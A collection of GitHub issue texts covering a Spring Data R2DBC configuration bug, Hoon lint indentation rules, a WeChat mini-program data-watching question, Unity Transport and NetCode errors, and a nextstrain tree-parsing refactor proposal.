	at reactor.core.publisher.FluxHandle$HandleConditionalSubscriber.onNext(FluxHandle.java:320) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxPeekFuseable$PeekConditionalSubscriber.onNext(FluxPeekFuseable.java:826) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.innerNext(FluxConcatMap.java:275) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxConcatMap$ConcatMapInner.onNext(FluxConcatMap.java:849) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxGenerate$GenerateSubscription.next(FluxGenerate.java:169) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at io.r2dbc.postgresql.message.backend.BackendMessageDecoder.lambda$decode$1(BackendMessageDecoder.java:100) ~[r2dbc-postgresql-1.0.0.M7.jar:na]
	at reactor.core.publisher.FluxGenerate$GenerateSubscription.slowPath(FluxGenerate.java:262) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxGenerate$GenerateSubscription.request(FluxGenerate.java:204) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.Operators$MultiSubscriptionSubscriber.set(Operators.java:1934) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.Operators$MultiSubscriptionSubscriber.onSubscribe(Operators.java:1808) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxGenerate.subscribe(FluxGenerate.java:83) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.Flux.subscribe(Flux.java:7800) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.drain(FluxConcatMap.java:442) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxConcatMap$ConcatMapImmediate.onNext(FluxConcatMap.java:244) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxPeek$PeekSubscriber.onNext(FluxPeek.java:192) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.core.publisher.FluxMap$MapSubscriber.onNext(FluxMap.java:114) ~[reactor-core-3.3.0.M1.jar:3.3.0.M1]
	at reactor.netty.channel.FluxReceive.drainReceiver(FluxReceive.java:206) ~[reactor-netty-0.9.0.M1.jar:0.9.0.M1]
	at reactor.netty.channel.FluxReceive.onInboundNext(FluxReceive.java:322) ~[reactor-netty-0.9.0.M1.jar:0.9.0.M1]
	at reactor.netty.channel.ChannelOperations.onInboundNext(ChannelOperations.java:335) ~[reactor-netty-0.9.0.M1.jar:0.9.0.M1]
	at reactor.netty.channel.ChannelOperationsHandler.channelRead(ChannelOperationsHandler.java:91) ~[reactor-netty-0.9.0.M1.jar:0.9.0.M1]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:374) ~[netty-transport-4.1.36.Final.jar:4.1.36.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:360) ~[netty-transport-4.1.36.Final.jar:4.1.36.Final]
	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:352) ~[netty-transport-4.1.36.Final.jar:4.1.36.Final]
	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1408) ~[netty-transport-4.1.36.Final.jar:4.1.36.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:374) ~[netty-transport-4.1.36.Final.jar:4.1.36.Final]
	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:360) ~[netty-transport-4.1.36.Final.jar:4.1.36.Final]
	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:930) ~[netty-transport-4.1.36.Final.jar:4.1.36.Final]
	at io.netty.channel.epoll.AbstractEpollStreamChannel$EpollStreamUnsafe.epollInReady(AbstractEpollStreamChannel.java:796) ~[netty-transport-native-epoll-4.1.36.Final-linux-x86_64.jar:4.1.36.Final]
	at io.netty.channel.epoll.EpollEventLoop.processReady(EpollEventLoop.java:432) ~[netty-transport-native-epoll-4.1.36.Final-linux-x86_64.jar:4.1.36.Final]
	at io.netty.channel.epoll.EpollEventLoop.run(EpollEventLoop.java:333) ~[netty-transport-native-epoll-4.1.36.Final-linux-x86_64.jar:4.1.36.Final]
	at io.netty.util.concurrent.SingleThreadEventExecutor$5.run(SingleThreadEventExecutor.java:906) ~[netty-common-4.1.36.Final.jar:4.1.36.Final]
	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) ~[netty-common-4.1.36.Final.jar:4.1.36.Final]
	at java.base/java.lang.Thread.run(Thread.java:834) ~[na:na]
``` Having multiple modules on the class path, other Spring Data modules (such as MongoDB) try to implement R2DBC repositories as Spring Data does not enter strict config mode.

This is, because `spring.factories` misses an entry for `RepositoryFactorySupport`. Having multiple modules on the class path, other Spring Data modules (such as MongoDB) try to implement R2DBC repositories as Spring Data does not enter strict config mode.

This is, because `spring.factories` misses an entry for `RepositoryFactorySupport`. 
<---------->
153697505
I think it may be a good idea to always allow column 1 comments.  These are used in 181 places, for things like commenting out code, meta-remarks, etc.  This seems like an eminently reasonable thing for the coders to be doing.

Here is one example, from `app/gmail.hoon`:

```
  ::  Subscription request
::    ++  listen
::      ^+  .
::      =+  events=?>(?=([@ @ *] pax) t.t.pax)
::      |-  ^+  +>.$
::      ?~  events
::        +>.$
::      ?:  (~(has by web-hooks) i.events)                ::  if hook exists
::        =.  +>.$  (update-hook i.events)
::        $(events t.events)
::      =.  +>.$  (create-hook i.events)
::      $(events t.events)
    ::
 
```

@ohAitch -- do you agree? [other_wuthep_kingside.txt](https://github.com/jeffreykegler/yahc/files/2848040/other_wuthep_kingside.txt)

@ohAitch Here is a list of WUTHEP kingside hoonlint warnings not pulled out for special treatment.
My suggestion is that you skim these just in case there remain some usages you want to be considered "acceptable".  If there are none, I will add all of these to the anomalies list. TISCOL (=:) is the only jogging-1 (jogging plus tail) hoon.  This comment will contain the file with the anomalies.  I will first follow up by documenting the jogging-1 format, before kicking this issue over to you as a question.  Here is the file with the anomalies.

[tiscol.lint.txt](https://github.com/jeffreykegler/yahc/files/2882071/tiscol.lint.txt)

The dill problem is, I think, an obvious extra space and therefore an anomaly.  For the zuse problems you may want to look at my (as yet unwritten) description of the jogging-1 indentation first, but the jogging is indented the same as the tail (both flush with the rune), and this does not follow the pattern of the other TISCOL's. @ohAitch -- [tiscol.lint.txt](https://github.com/jeffreykegler/yahc/files/2913315/tiscol.lint.txt)
I have updated the [whitespace doc](https://github.com/jeffreykegler/yahc/blob/master/misc/whitespace.md) for jogging-1 hoons, the remaining anomalies for which are in the file above.  I believe these can all be added to `anomaly.suppressions`.  Let me know.

[ This replaces issue #12 , which I am closing. ] This is broken out from #34.

@OhAitch -- the issue here is that I require a run-step's inter-commments to be first, before its pre-comments.  The ones below are out of order,.

Question: Chill, and allow any order for pre- and inter-comments?  Or add this to `anomaly.suppressions`?

```
 859            ;~((glue ace) (perk %unsource ~) cire sorz)
 860            ::TODO  why do these nest-fail when doing perk with multiple?
[ hoons/arvo/app/talk.hoon 864:11 Test::Whitespace semsig:comment-indent runstep #11 @861:9; comment underindented by 2
  1-running
  inter-comment indent should be 9
  pre-comment indent should be 11
  anchor column is @827:9 ";~"
]
 861!         ::
[ hoons/arvo/app/talk.hoon 864:11 Test::Whitespace semsig:comment-indent runstep #11 @862:9; comment underindented by 2
  1-running
  inter-comment indent should be 9
  pre-comment indent should be 11
  anchor column is @827:9 ";~"
]
 862!         ::  personal metadata
[ hoons/arvo/app/talk.hoon 864:11 Test::Whitespace semsig:comment-indent runstep #11 @863:9; comment underindented by 2
  1-running
  inter-comment indent should be 9
  pre-comment indent should be 11
  anchor column is @827:9 ";~"
]
 863!         ::
 864>           ;~  (glue ace)
``` @ohAitch I think that all of these are candidates for addition to `anomaly.suppression`.  Let me know where you disagree.

[wuthep_queen_anom.txt](https://github.com/jeffreykegler/yahc/files/2849182/wuthep_queen_anom.txt)
 As a reminder, what I am calling the 2-jogging hoons are CENTAR and WUTLUS, which have a jogging preceded by a head and a subhead.  In all cases in `arvo/`, the head and the rune are on the same line.  In 145 of the 165 cases, the head and subhead are on the same line -- I call the hoon "head-joined".  I did a census of the head-joined 2-jogging hoons.  Here are the results:

[head-joined.txt](https://github.com/jeffreykegler/yahc/files/2873855/head-joined.txt)

My analysis will follow in another comment.
 This is the first of my more verbose lint outputs.  Hopefully future issues will tend to be more targeted by specific anomaly as well.

These are all "off by one stop" runstop comment indents halfway between the correct indents, which are either at the anchor column or aligned with the runstep.

@ohAitch -- I believe all of these should be added to `anomaly.suppressions`.  Let me know what you think.

[by2.lint.txt](https://github.com/jeffreykegler/yahc/files/3132908/by2.lint.txt)
 [wutlus.lint.txt](https://github.com/jeffreykegler/yahc/files/2908559/wutlus.lint.txt)
 I implemented the restriction of staircase comment s to column 1, thinking that all staricases in the corpus began at column 1 and therefore this would cause no new warnings.

It turns out many staircases in `zuse.hoon` start at column 3.  Below is a lint output showing them.

@ohAitch -- I plan to revert the "fix", and to allow stairase comments to be aligned at any column, as was previously the case.  Do you agree?

[staircase3.lint.txt](https://github.com/jeffreykegler/yahc/files/3140407/staircase3.lint.txt)
 [1jogging.lint.txt](https://github.com/jeffreykegler/yahc/files/2903517/1jogging.lint.txt)
 This issue is intended to replace issue #4 -- here's a list of kingside bodies with extra indentation.  I'll follow with discussion in another comment.

[commented.wuthep.txt](https://github.com/jeffreykegler/yahc/files/2847972/commented.wuthep.txt)
 I believe I have the logic for 1-running hoons done.  Here is a list of anomalies, for addition `anomaly.suppressions`:
[semcol.lint.txt](https://github.com/jeffreykegler/yahc/files/2892255/semcol.lint.txt)
A lot of the anomalies are paired runsteps, And a lot of runsteps are indented to align with the head of the running, which I believe is incorrect.

I allow gaps with header comments.  Note that the comments in `gen/test.hoon` are incorrectly aligned for headers -- they align with the runsteps, not with the rune.
 @ohAitch -- a question:

I call a hoon 0-running if it consists only of a running -- no head no tail.  The 0-running hoons are BUCCEN, BUCCOL, BUCWUT, COLSIG, COLTAR, WUTBAR, WUTPAM.

These take two forms in the `arvo/` corpus, "split" and "joined", according to whether they .  "Split" is less common but not rare -- 133 of the 1232 occurrences are "split".  (This is frm count made using `grep`, but I expect it's pretty accurate).

From `hoon.hoon`@3153, here is an example of "joined".

```
      :~  [ral ruz]
          [8 128]
          [(mod (sub 960 (mod (add 8 ral) 512)) 512) 0]
          [64 (~(net fe 6) ral)]
      ==
```

and here from `scad` in `hoon.hoon` @11683 is the start of a very long example of "split":

```
    :~
      :-  '_'
        ;~(pfix cab (stag %bccb wide))
      :-  ','
        ;~(pfix com (stag %bcsm wide))
      :-  '$'
        ;~  pose
          ;~  pfix  buc
            ;~  pose
              (stag %leaf (stag %tas (cold %$ buc)))
              (stag %leaf (stag %f (cold & pam)))
              (stag %leaf (stag %f (cold | bar)))
              (stag %leaf (stag %t qut))
              (stag %leaf (sear |=(a/coin ?:(?=($$ -.a) (some +.a) ~)) nuck:so))
            ==
          ==
          (stag %bcsm rump)
        ==
      :-  '%'
 ```
Split is less common, but the existing examples are very long, so that if a split 0-jogging is not acceptable, many misindentation warnings will result.

The question: should `hoonlint` accept "split" 0-joggings?  Or only "joined" ones?
 Here is the lint output for `lute`'s, which will be the basis of comments to follow.

[lute.lint.txt](https://github.com/jeffreykegler/yahc/files/3024855/lute.lint.txt)
 Here's lint output which will be the basis of my comments, to follow.

[tissig.lint.txt](https://github.com/jeffreykegler/yahc/files/3024842/tissig.lint.txt)
 In lint, when the contexts overlap, combine the reports.  This issue is a spinoff of issue #4  [semsig.lint.txt](https://github.com/jeffreykegler/yahc/files/2921008/semsig.lint.txt)
Here are the current SEMSIG anomalies.  All but the ones in zuse my guess is that they should be added to `anomaly.suppressions`.

The zuse ones are warnings for cases where more than one runstep is on a line.  I have already coded an exception for when the first line contains more than one runstep, but here we have other cases.  One of them could be interpreted as paired runsteps, which you wanted accepted, but for SEMCOL this was one of the cans kicked down the road in `later.suppressions`.

Possible choices:

1.) Allow the initial lines of a running to have multiple runsteps, with the first singleton line ending the exception.

2.) Allow multiple runsteps on running lines is *all* of its running lines have more than one runstep -- in other words, if there are no singletons.

Note that 2.) is a special case of 1.)  Also note that making either 1.) or 2.) the rules would allow pairs, except that, unlike for the pair in a jog, there would be no enforcement of alignment.

@ohAitch -- Let me know what you think. I think it may be a good idea to always allow column 1 comments.  These are used in 181 places, for things like commenting out code, meta-remarks, etc.  This seems like an eminently reasonable thing for the coders to be doing.

Here is one example, from `app/gmail.hoon`:

```
  ::  Subscription request
::    ++  listen
::      ^+  .
::      =+  events=?>(?=([@ @ *] pax) t.t.pax)
::      |-  ^+  +>.$
::      ?~  events
::        +>.$
::      ?:  (~(has by web-hooks) i.events)                ::  if hook exists
::        =.  +>.$  (update-hook i.events)
::        $(events t.events)
::      =.  +>.$  (create-hook i.events)
::      $(events t.events)
    ::
 
```

@ohAitch -- do you agree? I implemented the restriction of staircase comment s to column 1, thinking that all staricases in the corpus began at column 1 and therefore this would cause no new warnings.

It turns out many staircases in `zuse.hoon` start at column 3.  Below is a lint output showing them.

@ohAitch -- I plan to revert the "fix", and to allow stairase comments to be aligned at any column, as was previously the case.  Do you agree?

[staircase3.lint.txt](https://github.com/jeffreykegler/yahc/files/3140407/staircase3.lint.txt)

<---------->
153870858
目前只能传入aaa，但是这样写看起来有点乱

比如
```
    first_goods_item: {
      require: ["res"],
      fn({ res }) {
        return res.list[0]
      }
    }
```
但希望变成
```
    first_goods_item: {
      require: ["res.list"],
      fn(payload) {
        return payload[0]
      }
    }
``` 目前只能传入aaa，但是这样写看起来有点乱

比如
```
    first_goods_item: {
      require: ["res"],
      fn({ res }) {
        return res.list[0]
      }
    }
```
但希望变成
```
    first_goods_item: {
      require: ["res.list"],
      fn(payload) {
        return payload[0]
      }
    }
``` 在页面的使用中，会用到App.js里globalData的数据
请问该如何实现监听这些数据
 目前只能传入aaa，但是这样写看起来有点乱

比如
```
    first_goods_item: {
      require: ["res"],
      fn({ res }) {
        return res.list[0]
      }
    }
```
但希望变成
```
    first_goods_item: {
      require: ["res.list"],
      fn(payload) {
        return payload[0]
      }
    }
``` 目前只能传入aaa，但是这样写看起来有点乱

比如
```
    first_goods_item: {
      require: ["res"],
      fn({ res }) {
        return res.list[0]
      }
    }
```
但希望变成
```
    first_goods_item: {
      require: ["res.list"],
      fn(payload) {
        return payload[0]
      }
    }
``` 在页面的使用中，会用到App.js里globalData的数据
请问该如何实现监听这些数据
 ![image](https://user-images.githubusercontent.com/5754329/56335203-2d23f800-61ce-11e9-953e-57256bdb254a.png)
![image](https://user-images.githubusercontent.com/5754329/56335208-33b26f80-61ce-11e9-8025-f8589518ece6.png)
![image](https://user-images.githubusercontent.com/5754329/56335222-3f059b00-61ce-11e9-84ad-0e55f3fe45ec.png)
当数组结构里的某个属性发生变化，则不生效啊，可能有bug插件。 ![image](https://user-images.githubusercontent.com/20377604/55697733-54700d80-59f5-11e9-8b5b-24c1bab4bb62.png)
![image](https://user-images.githubusercontent.com/20377604/55697748-6b166480-59f5-11e9-8caf-3534d49b131f.png)
 ![image](https://user-images.githubusercontent.com/20377604/55697733-54700d80-59f5-11e9-8b5b-24c1bab4bb62.png)
![image](https://user-images.githubusercontent.com/20377604/55697748-6b166480-59f5-11e9-8caf-3534d49b131f.png)
 ![image](https://user-images.githubusercontent.com/5754329/56335203-2d23f800-61ce-11e9-953e-57256bdb254a.png)
![image](https://user-images.githubusercontent.com/5754329/56335208-33b26f80-61ce-11e9-8025-f8589518ece6.png)
![image](https://user-images.githubusercontent.com/5754329/56335222-3f059b00-61ce-11e9-84ad-0e55f3fe45ec.png)
当数组结构里的某个属性发生变化，则不生效啊，可能有bug插件。
<---------->
153988618
After following the instructions to install, because I had already quite a bit of other packages installed, a lot of conflicts arose.
I fixed it by changing the com.unity.transport dependencies in the package.json to whatever version of those I am currently using and it worked. but I can see this being a roadblock to some people, also, give it a proper displayName, I am currently using Transport First of all: thanks for all of the hard work on this and releasing such concise documentation! It's a pleasure to see the new docs with plenty of code samples tying things together. We've had a good time building on top of UNet but are experiencing some growing pains with latency.

Apologies if this is asked often, but: is this library much faster than UNet? Fundamentally this library may be similar design wise to UNet and this is a dumb question! :) This doesn't work on the latest stable version of unity. I experienced an issue spawning a player in my setup and could verify it with the asteroids sample. The same happens there if asteroid count is set to 0 and the player tries to spawn the ship.

`IndexOutOfRangeException: Index 0 is out of range of '0' Length.
Unity.Collections.NativeArray`1[T].FailOutOfRangeError (System.Int32 index) (at C:/buildslave/unity/build/Runtime/Export/NativeArray/NativeArray.cs:207)
Unity.Collections.NativeArray`1[T].CheckElementWriteAccess (System.Int32 index) (at C:/buildslave/unity/build/Runtime/Export/NativeArray/NativeArray.cs:126)
Unity.Collections.NativeArray`1[T].set_Item (System.Int32 index, T value) (at C:/buildslave/unity/build/Runtime/Export/NativeArray/NativeArray.cs:145)
GhostSendSystem`1+SerializeJob[TGhostSerializerCollection].Execute () (at Assets/NetCode/Snapshot/GhostSendSystem.cs:449)
Unity.Jobs.IJobExtensions+JobStruct`1[T].Execute (T& data, System.IntPtr additionalPtr, System.IntPtr bufferRangePatchData, Unity.Jobs.LowLevel.Unsafe.JobRanges& ranges, System.Int32 jobIndex) (at C:/buildslave/unity/build/Runtime/Jobs/Managed/IJob.cs:30)` The server and client was working with the initial release. I kind of upgraded by changing UdpCNetworkDriver to new UdpNetworkDriver and IPEndPoints to NetworkEndpoints. But when i try to connect, client gives this error:

_DivideByZeroException: Attempted to divide by zero.
Unity.Networking.Transport.Utilities.ReliableUtility.Release (Unity.Collections.NativeSlice`1[T] self, System.Int32 start_sequence, System.Int32 count)_ 

The fuction i use to connect is this:
```
    public void ConnectToLocalhost()
    {
        var endpoint = NetworkEndPoint.Parse("127.0.0.1", 9000);
        endpoint.Port = 9000;
        m_Connection = m_Driver.Connect(endpoint);
    }
```
Error is on the line :

>         m_Connection = m_Driver.Connect(endpoint);

PS: I set up a debug message on the server that notifies me when a new connection is established. Connection message appears on server but it seems to receive no data. The server and client was working with the initial release. I kind of upgraded by changing UdpCNetworkDriver to new UdpNetworkDriver and IPEndPoints to NetworkEndpoints. But when i try to connect, client gives this error:

_DivideByZeroException: Attempted to divide by zero.
Unity.Networking.Transport.Utilities.ReliableUtility.Release (Unity.Collections.NativeSlice`1[T] self, System.Int32 start_sequence, System.Int32 count)_ 

The fuction i use to connect is this:
```
    public void ConnectToLocalhost()
    {
        var endpoint = NetworkEndPoint.Parse("127.0.0.1", 9000);
        endpoint.Port = 9000;
        m_Connection = m_Driver.Connect(endpoint);
    }
```

PS: I set up a debug message on the server that notifies me when a new connection is established. Connection message appears on server but it seems to receive no data. Hello. I have custom server with networking based on dotnetty. How i can use this package for work with him ? Its possible ? Why is there always existing latency with this network transport?
The Non-ECS Ping sample gives a ping of > 15 ms,
and the ECS Ping sample gives a minimal > 30 ms. Why is there always existing latency with this network transport?
The Non-ECS Ping sample gives a ping of > 15 ms,
and the ECS Ping sample gives a minimal > 30 ms. I followed the Unity Transport manual to build a simple client-server project, but I finally get some errors that are due to the APIs of `com.unity.transport` is updated.

I think it would be more friendly if the documents keep updating. Please add so you can specify priority instead or as well to the hierarchical rule that currently exists.

To add more worlds I have currently made a custom bootstrap written(extended the supplied one) and with editorscript which clones the netcode, modifies, and adds additional simulation groups for new worlds. ( I had to copy and modify to be able to modify the ClientSimulationSystemGroup or NetworkStreamReceiveSystem to add additional netcode in the client world - so I decided to copy everything and put it under my own namespace)

I want to keep the netcode in my project to be able to check for updates and simply use my script to redo my generation of worlds, but the ICustomBootstrap crashes since it has two of them that are not in hierarchy.

I would ask to add either some encapsulation of a define, or another attribute to add that can have a priority. In the latest preview version of Unity.Collections, `NativeQueue<T>.Concurrent` and `NativeQueue<T>.ToConcurrent()` are marked as deprecated, which leads to compiler warnings. I've followed the quickstart guide for the NetCode. I got everything setup. Cube and Plane spawns, but when I want to add a Unity Terrain in Mixed World it doesn't spawn? What am I doing wrong?
 I am using the latest Transport package code with Unity 2019.2.1f1. I've tested in Unity Editor, macOS Standalone, and Android - all three are working.

However, when I run on iOS, I see an error at startup:
`Unable to find internal function "Unity.Networking.Transport.NativeBindings::network_sendmsg"
Unity.Jobs.JobStruct1:Initialize()
Unity.Jobs.IJobExtensions:Schedule(T, JobHandle)
Unity.Networking.Transport.GenericNetworkDriver2:.cctor()`

If I later try to send data, the app crashes.

I was able to resolve similar-looking errors with ECS by adding entries to link.xml, but adding "Unity.Networking.Transport" to link.xml doesn't seem to help.

I had thought this was maybe an IL2CPP code stripping issue, but the package does work in Android and macOS builds built with IL2CPP enabled.

It would be great to fix this, but I'm also curious what the cause is (stripped code? incompatible Unity version? etc) and whether there's any workaround.

Thanks! This line from the documentation
`using UdpCNetworkDriver = Unity.Networking.Transport.BasicNetworkDriver<Unity.Networking.Transport.IPv4UDPSocket>;
`
Is throwing this error 

> The type or namespace name 'BasicNetworkDriver<>' does not exist in the namespace 'Unity.Networking.Transport' (are you missing an assembly reference? If you simply download and attempt to run the samples on Linux (after you get around the Burst package dependency problem with Mathematics) you will only get an error when running:

DllNotFoundException: network.bindings
Unity.Networking.Transport.IPv4UDPSocket.Initialize () (at /home/master/Projects/multiplayer-master/com.unity.transport/Runtime/NetworkInterface.cs:145)
Unity.Networking.Transport.GenericNetworkDriver`2[T,TNetworkPipelineStageCollection]..ctor (Unity.Networking.Transport.INetworkParameter[] param) (at /home/master/Projects/multiplayer-master/com.unity.transport/Runtime/NetworkDriver.cs:355)
Unity.Networking.Transport.UdpNetworkDriver..ctor (Unity.Networking.Transport.INetworkParameter[] param) (at /home/master/Projects/multiplayer-master/com.unity.transport/Runtime/NetworkDriver.cs:1194)
NetworkStreamReceiveSystem.OnCreateManager () (at Assets/NetCode/Connection/NetworkStreamReceiveSystem.cs:89)
Unity.Entities.ComponentSystemBase.CreateInstance (Unity.Entities.World world) (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities/ComponentSystem.cs:201)
Unity.Entities.World.AddSystem[T] (T system) (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities/World.cs:341)
Unity.Entities.World.CreateSystemInternal (System.Type type, System.Object[] constructorArguments) (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities/World.cs:235)
Unity.Entities.World.GetOrCreateSystemInternal (System.Type type) (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities/World.cs:251)
Unity.Entities.World.GetOrCreateSystem[T] () (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities/World.cs:272)
GhostSendSystem`1[TGhostSerializerCollection].OnCreateManager () (at Assets/NetCode/Snapshot/GhostSendSystem.cs:121)
Unity.Entities.ComponentSystemBase.CreateInstance (Unity.Entities.World world) (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities/ComponentSystem.cs:201)
Unity.Entities.World.AddSystem[T] (T system) (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities/World.cs:341)
Unity.Entities.World.CreateSystemInternal (System.Type type, System.Object[] constructorArguments) (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities/World.cs:235)
Unity.Entities.World.GetOrCreateSystemInternal (System.Type type) (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities/World.cs:251)
Unity.Entities.World.GetOrCreateSystem (System.Type type) (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities/World.cs:279)
ClientServerBootstrap.Initialize (System.Collections.Generic.List`1[T] systems) (at Assets/NetCode/ClientServerWorld.cs:495)
Unity.Entities.DefaultWorldInitialization.GetAllSystems (Unity.Entities.WorldSystemFilterFlags filterFlags) (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities.Hybrid/Injection/DefaultWorldInitialization.cs:253)
Unity.Entities.DefaultWorldInitialization.Initialize (System.String worldName, System.Boolean editorWorld) (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities.Hybrid/Injection/DefaultWorldInitialization.cs:53)
Unity.Entities.AutomaticWorldBootstrap.Initialize () (at Library/PackageCache/com.unity.entities@0.0.12-preview.33/Unity.Entities.Hybrid/Injection/AutomaticWorldBootstrap.cs:11)
 Hello Everyone,

Im having few questions about the Unity.Networking.Transport. (Tank You in advance)

**1)** is it possible to Connect using the same Driver for Both  Reliable and Unreliable pipelines or should i Create 2 different connections and drivers ?  

**2)** is it possible to Send data within the Connect Request  to let clients show their identities to server before being accepted ? (like a session key)


 Can you please provide instructions for how to build standalone client and server? And also how to test both of them in the Play mode. Also the directives of UNITY_CLIENT and UNITY_SERVER are not really documented in Unity manual, can you please clarify if we have to set those manually or are they set automatically by the IDE?

At the moment I can only run if I set PlayMode to Server and build the client using UNITY_CLIENT directive manually set. If I try to set UNITY_SERVER directive the compilation fails. I have to run the server in PlayMode Server settings so I can get 2 clients connected.

Just a README.md would be great. During startup of my unity project, I receive the following message:

> An error occurred while resolving packages:
Project has invalid dependencies:
com.unity.transport
[C:\Users\me\Desktop\UnityProjects\Prototype Projects\Packages\multiplayer\com.unity.transport\package.json] cannot be found
A re-import of the project may be required to fix the issue or a manual modification of C:\Users\me\Desktop\UnityProjects\Prototype Projects\Packages\manifest.json file.

Now, I have installed the multiplayer folder from: https://github.com/Unity-Technologies/multiplayer. The "multiplayer" folder was placed two folders up from the project that I wish to use it in. I followed the direction provided in the documentations folder and I am confused about what I have done wrong.

Any help would be much appreciated, thanks! Library\PackageCache\com.unity.burst@1.0.4\Editor\BurstAotCompiler.cs(638,32): error CS7036: There is no argument given that corresponds to the required formal parameter 'exceptionType' of 'BuildReport.AddMessage(LogType, string, string)'

<hr/>

            private static void RunProgram(
              Program p,
              string exe,
              string args,
              string workingDirectory,
              CompilerOutputParserBase parser,
              BuildReport report)
            {
                Stopwatch stopwatch = new Stopwatch();
                stopwatch.Start();
                using (p)
                {
                    p.GetProcessStartInfo().WorkingDirectory = workingDirectory;
                    p.Start();
                    p.WaitForExit();
                    stopwatch.Stop();

                    Console.WriteLine("{0} exited after {1} ms.", (object)exe, (object)stopwatch.ElapsedMilliseconds);
                    IEnumerable<UnityEditor.Scripting.Compilers.CompilerMessage> compilerMessages = null;
                    string[] errorOutput = p.GetErrorOutput();
                    string[] standardOutput = p.GetStandardOutput();
                    if (parser != null)
                    {
                        compilerMessages = parser.Parse(errorOutput, standardOutput, true, "n/a (burst)");
                    }

                    var errorMessageBuilder = new StringBuilder();
                    if (p.ExitCode != 0)
                    {
                        if (compilerMessages != null)
                        {
                            foreach (UnityEditor.Scripting.Compilers.CompilerMessage compilerMessage in compilerMessages)
                            {
                                Debug.LogPlayerBuildError(compilerMessage.message, compilerMessage.file, compilerMessage.line, compilerMessage.column);
                            }
                        }

                        // We try to output the version in the heading error if we can
                        var matchVersion = MatchVersion.Match(exe);
                        errorMessageBuilder.Append(matchVersion.Success ?
                            "Burst compiler (" + matchVersion.Groups[1].Value + ") failed running" :
                            "Burst compiler failed running");
                        errorMessageBuilder.AppendLine();
                        errorMessageBuilder.AppendLine();
                        // Don't output the path if we are not burst-debugging or the exe exist
                        if (BurstLoader.IsDebugging || !File.Exists(exe))
                        {
                            errorMessageBuilder.Append(exe).Append(" ").Append(args);
                            errorMessageBuilder.AppendLine();
                            errorMessageBuilder.AppendLine();
                        }

                        errorMessageBuilder.AppendLine("stdout:");
                        foreach (string str in standardOutput)
                            errorMessageBuilder.AppendLine(str);
                        errorMessageBuilder.AppendLine("stderr:");
                        foreach (string str in errorOutput)
                            errorMessageBuilder.AppendLine(str);

                        // We don't use Debug.LogError as it displays a stacktrace that we really don't want to pollute our message output
                        //report.AddMessage(LogType.Error, errorMessageBuilder.ToString());
                        Debug.LogPlayerBuildError(errorMessageBuilder.ToString(), "unknown", 0, 0);

                        // We report the error to the build player but it seems that it is not correctly reported.
                        // In Editor\Src\BuildPipeline\BuildPlayer.cpp
                        //    if (report.GetSuccess())
                        //    {
                        //        DisplayProgressNotification("Build Successful", "");
                        //    }
                        //
                        //    report.UnregisterForLogMessages();
                        //    report.EndBuildStep(buildStepToken);
                        //    report.UpdateSummary();
                        //
                        // Actually report.GetSuccess() should go after the last UpdateSummary()
                        //
                        // We should probably have a method report.SetBuildStatus(error)
                        report.AddMessage(LogType.Error, errorMessageBuilder.ToString());
                    }
                    Console.WriteLine(p.GetAllOutput());
                }
            }
        }

<hr/>

    [MethodImpl(MethodImplOptions.InternalCall)]
    internal extern void AddMessage(LogType messageType, string message, string exceptionType);

<---------->
154029525
The current script to import tip clades from HA to non-HA segments identifies internal nodes by [checking that the first four characters of the node name match "NODE"](https://github.com/nextstrain/seasonal-flu/blob/1f07773/scripts/import_tip_clades.py#L31). The fact that internal nodes have this specific name is [a design decision from TreeTime](https://github.com/neherlab/treetime/blob/273a236/treetime/treeanc.py#L766). This approach tries to infer the data structure from the data contents when information about the structure is already available in an external Newick file.

I'd suggest we pass the original HA tree Newick to this script and use the Bio.Phylo `is_terminal` method to identify internal nodes instead of testing for specific text. This change will prevent the script from silently breaking when/if TreeTime names internal nodes something different in the future and will avoid confusion when someone would otherwise have to figure out where the "NODE" text comes (I admit this took me a little while to track down). Although this change couples the script to the Bio.Phylo interface, that interface is something more easily grepped for and replaced during a future refactor.

